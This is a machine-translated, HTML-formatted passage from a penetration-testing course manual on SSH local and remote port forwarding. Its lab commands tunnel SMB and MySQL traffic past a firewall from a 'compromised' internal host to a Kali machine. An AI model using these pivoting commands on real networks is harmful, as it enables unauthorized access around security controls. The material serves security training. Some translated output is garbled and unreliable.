<div style="position:absolute;top:191676;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">; </font><font style="vertical-align: inherit;">写入列表 = 根，@lpadmin</font></font></nobr></div>
</span></font>
<font size="3" color="#c00000" face="Times"><span style="font-size:11px;font-family:Times;color:#c00000">
<div style="position:absolute;top:191709;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">最小协议 = SMB2</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:191744;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">sudo /etc/init.d/smbd restart</font></font></font></b></nobr></div>
<div style="position:absolute;top:191761;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[ ok ] 重新启动 smbd（通过 systemctl）：smbd.service。</font></font></nobr></div>
<div style="position:absolute;top:191780;left:255"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 635 - 将 SAMBA 从 SMBv1 更新为 SMBv2 通信</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:191809;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">最后，我们可以尝试通过指向 Windows Server 2016 机器上的远程共享</font></font></nobr></div>
<div style="position:absolute;top:191828;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在我们的 Kali 机器上提出要求。</font></font></nobr></div>
<div style="position:absolute;top:191861;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们将使用</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">smbclient</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">实用程序，提供 IP 地址或 NetBIOS 名称，在本例中为我们的本地</font></font></nobr></div>
<div style="position:absolute;top:191881;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">机器（</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-L 127.0.0.1</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">）和远程用户名（</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-U Administrator</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">）。</font><font style="vertical-align: inherit;">如果一切顺利</font></font></nobr></div>
<div style="position:absolute;top:191900;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">按照计划，我们输入远程密码后，该端口上的所有流量都将被重定向</font></font></nobr></div>
<div style="position:absolute;top:191920;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">到 Windows 机器，我们将看到可用的共享：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:191954;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~# </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">smbclient -L 127.0.0.1 -U 管理员</font></font></font></b></nobr></div>
<div style="position:absolute;top:191971;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">无法初始化消息上下文</font></font></nobr></div>
<div style="position:absolute;top:191988;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">输入 WORKGROUP\Administrator 的密码： </font></font></nobr></div>
<div style="position:absolute;top:192022;left:141"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">共享名类型注释</font></font></nobr></div>
<div style="position:absolute;top:192039;left:141"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">------- ---- -------</font></font></nobr></div>
<div style="position:absolute;top:192056;left:141"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">管理员$    </font></font></nobr></div>
<div style="position:absolute;top:192056;left:271"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">磁盘远程管理</font></font></nobr></div>
<div style="position:absolute;top:192073;left:141"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">加元    </font></font></nobr></div>
<div style="position:absolute;top:192073;left:271"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">磁盘默认共享</font></font></nobr></div>
<div style="position:absolute;top:192090;left:141"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">数据    </font></font></nobr></div>
<div style="position:absolute;top:192090;left:271"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">磁盘    </font></font></nobr></div>
<div style="position:absolute;top:192107;left:141"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">IPC$    </font></font></nobr></div>
<div style="position:absolute;top:192107;left:271"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">工控机远程工控机</font></font></nobr></div>
<div style="position:absolute;top:192124;left:141"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">网络登录    </font></font></nobr></div>
<div style="position:absolute;top:192124;left:271"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">磁盘登录服务器共享 </font></font></nobr></div>
<div style="position:absolute;top:192141;left:141"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">系统卷    </font></font></nobr></div>
<div style="position:absolute;top:192141;left:271"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">磁盘登录服务器共享 </font></font></nobr></div>
<div style="position:absolute;top:192158;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">重新连接 SMB1 以获得工作组列表。</font></font></nobr></div>
<div style="position:absolute;top:192192;left:141"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">服务器    </font></font></nobr></div>
<div style="position:absolute;top:192192;left:311"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">评论</font></font></nobr></div>
<div style="position:absolute;top:192209;left:141"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">---------    </font></font></nobr></div>
<div style="position:absolute;top:192209;left:311"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-------</font></font></nobr></div>
<div style="position:absolute;top:192243;left:141"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">工作组    </font></font></nobr></div>
<div style="position:absolute;top:192243;left:311"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">掌握</font></font></nobr></div>
<div style="position:absolute;top:192260;left:141"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">---------    </font></font></nobr></div>
<div style="position:absolute;top:192260;left:311"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-------</font></font></nobr></div>
<div style="position:absolute;top:192279;left:175"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 636 - 通过本地端口转发列出 Windows Server 2016 机器上的网络共享</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:192308;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">不仅命令成功，而且由于此流量是通过 SSH 隧道传输的，因此整个</font></font></nobr></div>
<div style="position:absolute;top:192328;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">交易被加密。</font><font style="vertical-align: inherit;">我们可以使用这个端口转发设置来继续分析目标</font></font></nobr></div>
<div style="position:absolute;top:192347;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">服务器通过445端口，或转发其他端口进行额外的侦察。</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:16px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:192382;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">20.2.1.1 练习</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:192412;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">1. 连接到您的专用 Linux 实验室客户端并从以下位置运行 clear_rules.sh 脚本</font></font></nobr></div>
<div style="position:absolute;top:192431;left:145"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">/root/port_forwarding_and_tunneling/ 作为 root。</font></font></nobr></div>
<div style="position:absolute;top:192459;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">2. 从 /root/port_forwarding_and_tunneling/ 运行 ssh_local_port_forwarding.sh 脚本作为</font></font></nobr></div>
<div style="position:absolute;top:192479;left:145"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">根。 </font></font></nobr></div>
</span></font>

<div style="position:absolute;top:192631;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="163"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 163 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:192664;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:193741;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:193741;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:193741;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">604</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:192760;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">3. 记下 Student 中显示的 Linux 客户端和 Windows Server 2016 IP 地址</font></font></nobr></div>
<div style="position:absolute;top:192779;left:145"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">控制面板。</font></font></nobr></div>
<div style="position:absolute;top:192807;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">4. 尝试复制上述场景中涵盖的 smbclient 枚举。</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:18px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:192842;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">20.2.2</font></font></i></nobr></div>
<div style="position:absolute;top:192842;left:217"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">SSH 远程端口转发</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:192880;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">SSH 中</font><font style="vertical-align: inherit;">的</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">远程端口转发</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">功能可以认为是本地端口转发的逆向，</font></font></nobr></div>
<div style="position:absolute;top:192899;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">因为</font><font style="vertical-align: inherit;">在连接</font><font style="vertical-align: inherit;">的</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">远程</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">端</font><font style="vertical-align: inherit;">打开了一个端口</font><font style="vertical-align: inherit;">，并且发送到该端口的流量是</font></font></nobr></div>
<div style="position:absolute;top:192919;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">转发到我们本地机器（启动 SSH 客户端的机器）上的一个端口。</font></font></nobr></div>
<div style="position:absolute;top:192951;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">简而言之，到远程主机上指定 TCP 端口的连接将被转发到指定的</font></font></nobr></div>
<div style="position:absolute;top:192971;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">本地机器上的端口。</font><font style="vertical-align: inherit;">这可以通过新场景得到最好的证明。</font></font></nobr></div>
<div style="position:absolute;top:193004;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在这种情况下，我们可以访问内部网络上 Linux 客户端上的非 root shell。</font><font style="vertical-align: inherit;">在这</font></font></nobr></div>
<div style="position:absolute;top:193023;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">受感染的机器，我们发现 MySQL 服务器正在 TCP 端口 3306 上运行。</font></font></nobr></div>
<div style="position:absolute;top:193042;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">之前的场景，防火墙阻止入站 TCP 端口 22 (SSH) 连接，所以我们不能 SSH</font></font></nobr></div>
<div style="position:absolute;top:193061;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">从我们连接互联网的 Kali 机器进入这个服务器。</font></font></nobr></div>
<div style="position:absolute;top:193094;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们可以，但是，SSH从该服务器</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">出</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们的卡利攻击机，由于出站TCP端口</font></font></nobr></div>
<div style="position:absolute;top:193114;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">22 允许通过防火墙。</font><font style="vertical-align: inherit;">我们可以利用 SSH 远程端口转发（使用</font><b><font style="font-size:13px"><font style="vertical-align: inherit;">ssh</font></font></b><font style="vertical-align: inherit;">调用</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"></font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:13px;font-family:Times">
<div style="position:absolute;top:193134;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-R </font></font></b><font style="font-size:14px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">) 在我们的 Kali 机器上打开一个端口，将流量转发到 MySQL 端口 (TCP 3306)</font></font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:193153;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">内部服务器。</font><font style="vertical-align: inherit;">所有转发的流量都将穿过 SSH 隧道，直接穿过防火墙。</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:14px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:193214;left:174"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">SSH 端口转发可以以非 root 用户身份运行，只要我们只绑定未使用的</font></font></i></nobr></div>
<div style="position:absolute;top:193234;left:174"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">非特权本地端口（1024 以上）。</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:193296;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">为了模拟这种情况，我们将在我们的设备上运行 ssh_remote_port_forwarding.sh 脚本</font></font></nobr></div>
<div style="position:absolute;top:193315;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">专用 Linux 客户端：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:193350;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">root@debian:~# </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">cat /root/port_forwarding_and_tunneling/ssh_remote_port_forwarding.sh</font></font></font></b></nobr></div>
<div style="position:absolute;top:193367;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">#!/bin/bash</font></font></nobr></div>
<div style="position:absolute;top:193401;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"># 清除iptables规则</font></font></nobr></div>
<div style="position:absolute;top:193418;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">iptables -P 输入接受</font></font></nobr></div>
<div style="position:absolute;top:193435;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">iptables -P 向前接受</font></font></nobr></div>
<div style="position:absolute;top:193452;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">iptables -P 输出接受</font></font></nobr></div>
<div style="position:absolute;top:193469;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">iptables -F</font></font></nobr></div>
<div style="position:absolute;top:193486;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">iptables -X</font></font></nobr></div>
<div style="position:absolute;top:193520;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"># SSH 场景</font></font></nobr></div>
<div style="position:absolute;top:193537;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">iptables -F</font></font></nobr></div>
<div style="position:absolute;top:193554;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">iptables -P 输入删除</font></font></nobr></div>
<div style="position:absolute;top:193571;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">iptables -P FORWARD DROP</font></font></nobr></div>
<div style="position:absolute;top:193588;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">iptables -A 输入 -i lo -j 接受</font></font></nobr></div>
<div style="position:absolute;top:193605;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">iptables -A INPUT -m state --state ESTABLISHED,RELATED -j ACCEPT</font></font></nobr></div>
<div style="position:absolute;top:193622;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">iptables -A INPUT -p tcp --dport 3389 -m state --state NEW -j ACCEPT</font></font></nobr></div>
<div style="position:absolute;top:193639;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">iptables -A 输入 -i lo -j 接受</font></font></nobr></div>
<div style="position:absolute;top:193673;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">root@debian:~# </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">/root/port_forwarding_and_tunneling/ssh_remote_port_forwarding.sh</font></font></font></b></nobr></div>
<div style="position:absolute;top:193692;left:271"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 637 - ssh_remote_port_forwarding.sh 脚本的内容 </font></font></i></nobr></div>
</span></font>

<div style="position:absolute;top:193819;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="164"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 164 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:193852;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:194929;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:194929;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:194929;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">605</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:193948;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">创建此隧道</font><font style="vertical-align: inherit;">的</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ssh</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">命令语法将包括本地 IP 和端口、远程 IP 和</font></font></nobr></div>
<div style="position:absolute;top:193967;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">端口和</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-R</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">指定远程转发：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:194002;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ssh -N -R [bind_address:]port:host:hostport [用户名@地址]</font></font></nobr></div>
<div style="position:absolute;top:194021;left:253"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 638 - 使用 SSH 进行远程端口转发的命令原型</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:194051;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在这种情况下，我们将以</font><font style="vertical-align: inherit;">kali 用户 ( </font><b><font style="font-size:13px"><font style="vertical-align: inherit;">kali@10.11.0.4</font></font></b><font style="vertical-align: inherit;"> ) </font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ssh</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">到我们的 Kali 机器</font><font style="vertical-align: inherit;">，指定 no</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"></font></font></b><font style="vertical-align: inherit;"></font></nobr></div>
<div style="position:absolute;top:194070;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">命令（</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-N</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">）和远程转发（</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-R</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">）。</font><font style="vertical-align: inherit;">我们将在 Kali 的 TCP 端口 2221 上打开一个监听器</font></font></nobr></div>
<div style="position:absolute;top:194090;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">机器 ( </font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">10.11.0.4:2221</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> ) 并将连接转发到内部 Linux 机器的 TCP 端口</font></font></nobr></div>
<div style="position:absolute;top:194109;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">3306 ( </font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">127.0.0.1:3306</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> )：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:194144;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">student@debian:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ssh -N -R 10.11.0.4:2221:127.0.0.1:3306 kali@10.11.0.4</font></font></font></b></nobr></div>
<div style="position:absolute;top:194161;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@10.11.0.4 的密码： </font></font></nobr></div>
<div style="position:absolute;top:194180;left:167"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 639 - 远程转发 TCP 端口 2221 到 TCP 端口 3306 上受感染的 Linux 机器</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:194210;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">这会将我们 Kali 系统本地端口 2221 上的所有传入流量转发到</font></font></nobr></div>
<div style="position:absolute;top:194229;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">通过 SSH 隧道 (TCP 22) 破解盒子，甚至允许我们访问 MySQL 端口</font></font></nobr></div>
<div style="position:absolute;top:194248;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">尽管它在防火墙处被过滤。</font></font></nobr></div>
<div style="position:absolute;top:194281;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们的连接可以如图 299 所示：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:194704;left:331"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">图 299：远程端口转发图 </font></font></i></nobr></div>
</span></font>

<div style="position:absolute;top:195007;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="165"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 165 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:195040;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:196117;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:196117;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:196117;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">606</font></font></nobr></div>
</span></font>
<font size="2" color="#ffffff" face="Times"><span style="font-size:5px;font-family:Times;color:#ffffff">
<div style="position:absolute;top:195130;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">20.2.2.1.1</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:195151;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">隧道开通后，我们可以切换到 Kali 机器，验证 TCP 端口 2221 是否正在侦听，然后</font></font></nobr></div>
<div style="position:absolute;top:195170;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">nmap</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">扫描该端口上的本地主机</font><font style="vertical-align: inherit;">，这将识别目标的 MySQL 服务：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:195205;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ss -antp | </font><font style="vertical-align: inherit;">grep "2221"</font></font></font></b></nobr></div>
<div style="position:absolute;top:195222;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">听 0 128 127.0.0.1:2221 0.0.0.0:* 用户:(("sshd",pid=2294,fd=9))</font></font></nobr></div>
<div style="position:absolute;top:195239;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">听 0 128 [::1]:2221    </font></font></nobr></div>
<div style="position:absolute;top:195239;left:441"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[::]:* 用户:(("sshd",pid=2294,fd=8))</font></font></nobr></div>
<div style="position:absolute;top:195273;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">sudo nmap -sS -sV 127.0.0.1 -p 2221</font></font></font></b></nobr></div>
<div style="position:absolute;top:195307;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">本地主机 (127.0.0.1) 的 Nmap 扫描报告</font></font></nobr></div>
<div style="position:absolute;top:195324;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">主机已启动（0.000039 秒延迟）。</font></font></nobr></div>
<div style="position:absolute;top:195358;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">港口国服务版本</font></font></nobr></div>
</span></font>
<font size="3" color="#c00000" face="Times"><span style="font-size:11px;font-family:Times;color:#c00000">
<div style="position:absolute;top:195375;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">2221/tcp 打开 mysql MySQL 5.5.5-10.1.26-MariaDB-0+deb9u1</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:195409;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Nmap 完成：1 个 IP 地址（1 个主机启动）在 0.56 秒内扫描</font></font></nobr></div>
<div style="position:absolute;top:195428;left:197"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 640 - 通过远程隧道访问受害机器上的 MYSQL 服务器</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:195457;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">知道可以扫描端口了，跟MySQL服务交互应该没有问题</font></font></nobr></div>
<div style="position:absolute;top:195477;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用任何适当的 Kali 安装工具跨 SSH 隧道。</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:16px;font-family:Times;color:#0070c0">
